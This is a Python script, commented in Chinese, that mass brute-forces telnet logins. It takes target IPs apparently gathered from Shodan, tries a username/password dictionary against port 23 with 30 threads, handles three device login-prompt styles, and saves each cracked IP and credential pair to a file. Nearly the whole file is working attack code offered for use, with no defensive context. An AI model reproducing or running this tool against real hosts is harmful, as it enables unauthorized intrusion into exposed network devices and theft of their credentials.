import logging
import telnetlib
import time
import threadpool

user_password = []
extract_shodan_jason_IP = []
success_IP = []
success_Username = []
success_Password = []
success_list=[]

class switch(object): #自定義switch case功能
    def __init__(self, value):
        self.value = value
        self.fall = False

    def __iter__(self):
        """Return the match method once, then stop"""
        yield self.match
        raise StopIteration

    def match(self, *args):
        """Indicate whether or not to enter a case suite"""
        if self.fall or not args:
            return True
        elif self.value in args: 
            self.fall = True
            return True
        else:
            return False

class TelnetClient():
    def __init__(self,):
        self.tn = telnetlib.Telnet()

    def umtfk(self,host_ip,status):
        telnet_client = TelnetClient()
       

        for user_password_List in user_password:
            if telnet_client.login_host(host_ip,status,user_password_List[0],user_password_List[1])==1:
                return True
        

    def login_host(self,host_ip,status,username,password):#自定義遠端連線功能
        
        try:
            flag=0 #flag用於判斷字典中的帳號密碼是否成功登入
            self.tn.open(host_ip,port=23)#連線到目標
        except:
            print('%s網絡連接失敗'%host_ip)
            return False
        try:
            for case in switch(status): #三種類型不同的處理方式

                if case('1'):

                    self.tn.read_until(b'Press Return to get started',timeout=10)#直到讀到'Press Return to get started'為止或是10秒沒收到'Press Return to get started'，不進入下一行程式碼
                    self.tn.write(b'\n')#寫入Enter
                    self.tn.read_until(b'Login:',timeout=10)
                    self.tn.write(username.encode('utf-8') + b'\n')
                    self.tn.read_until(b'Password:',timeout=10)
                    self.tn.write(password.encode('utf-8') + b'\n')
                    time.sleep(2)
                    command_result = self.tn.read_very_eager().decode('ascii')#讀取所有的回應訊息
                    if '>' in command_result:#判斷回應訊息有'>'表示登入成功
                        flag=1#記錄成功的flag
                        print('%s 登錄成功'%host_ip)
                        success_IP.append(host_ip)#將成功的IP，Username，Password加入list儲存起來
                        success_Username.append(username)
                        success_Password.append(password)
                        break
                    
                    elif 'Information incomplete' in command_result:
                        flag=0#記錄失敗的flag
                        print('%s 登錄失敗，用戶名或密碼錯誤'%host_ip)
                        break  
                    else:
                        flag=0
                        print('%s:error:%s'%(host_ip,command_result))
                        break
                      
                    

                if case('2'):
                    
                    self.tn.read_until(b'Username:',timeout=10)
                    self.tn.write(username.encode('utf-8') + b'\n')
                    self.tn.read_until(b'Password:',timeout=10)
                    self.tn.write(password.encode('utf-8') + b'\n')
                    time.sleep(2)
                    command_result = self.tn.read_very_eager().decode('ascii')
                    if '>' in command_result:
                        flag=1
                        print('%s 登錄成功'%host_ip)
                        success_flag=1
                        success_IP.append(host_ip)
                        success_Username.append(username)
                        success_Password.append(password)
                        break
                    elif 'Information incomplete' in command_result:
                        flag=0
                        print('%s 登錄失敗，用戶名或密碼錯誤'%host_ip)
                        
                        break 
                    else:
                        flag=0
                        print('%s:error:%s'%(host_ip,command_result))
                        break       

                if case('3'):
                    
                    self.tn.read_until(b'Username:',timeout=10)
                    self.tn.write(username.encode('utf-8') + b'\n')
                    self.tn.read_until(b'Password:',timeout=10)
                    self.tn.write(password.encode('utf-8') + b'\n')
                    time.sleep(2)
                    command_result = self.tn.read_very_eager().decode('ascii')
                    if '>' in command_result:
                        flag=1
                        print('%s 登錄成功'%host_ip)
                        success_flag=1
                        success_IP.append(host_ip)
                        success_Username.append(username)
                        success_Password.append(password)
                        break
                    elif '% No username or bad password' in command_result:
                        flag=0
                        print('%s 登錄失敗，用戶名或密碼錯誤'%host_ip)
                        break  
                    else:
                        flag=0
                        print('%s:error:%s'%(host_ip,command_result))
                        breakpoint
         
            if flag==1:
                print('success')
                return flag
        except:
            print('%s 中斷連線'%host_ip)
                       
                
        

def try_telnet():
   
    telnet_client = TelnetClient()
          
    extract_shodan_jason_IP_Handle = []
    extract_shodan_jason_f = open(r'extract_shodan_json.txt')
    extract_shodan_jason_f = map(lambda x: x.strip(), extract_shodan_jason_f)
    extract_shodan_jason_f_Handle = [x.strip() for x in extract_shodan_jason_f if x.strip() != '']

    for extract_shodan_jason_line in extract_shodan_jason_f_Handle:
        extract_shodan_jason_s=extract_shodan_jason_line.split(":")
        extract_shodan_jason_IP.append(extract_shodan_jason_s)

    swqdqwdwq=[]


    user_password_f = open(r'username_password.txt')#開啟username_password.txt帳號密碼檔
    user_password_f = map(lambda x: x.strip(), user_password_f)
    user_password_f_Handle = [x.strip() for x in user_password_f if x.strip() != '']#消除帳號密碼檔中的空格
            
    for user_password_line in user_password_f_Handle:
        user_password_str=user_password_line.split(":")#以:為分割點，分隔左右兩邊的參數，並加入list
        user_password.append(user_password_str)
        
        # 如果登錄結果返加True，則執行命令，然後退出
    for extract_shodan_jason_IP_List in extract_shodan_jason_IP:
        userdic ={}
        userdic['host_ip']=extract_shodan_jason_IP_List[0]
        userdic['status']=extract_shodan_jason_IP_List[1]
        tmp=(None,userdic)
        swqdqwdwq.append(tmp)

    pool = threadpool.ThreadPool(30)#執行緒
    requests = threadpool.makeRequests(telnet_client.umtfk,swqdqwdwq)  
    [pool.putRequest(req) for req in requests]  
    pool.wait()  
    
    
    
    


if __name__ == '__main__':
    try_telnet()
    with open("success_Target.txt","w") as success_f:   
        for i in range(len(success_IP)) :
            success_list.append('IP:%s Username:%s Password:%s'%(success_IP[i],success_Username[i],success_Password[i]))#將成功IP，Username，Password加入list
            print(success_list[i]+'\n')
            success_f.write(success_list[i]+'\n')
    
    
            

    
























    
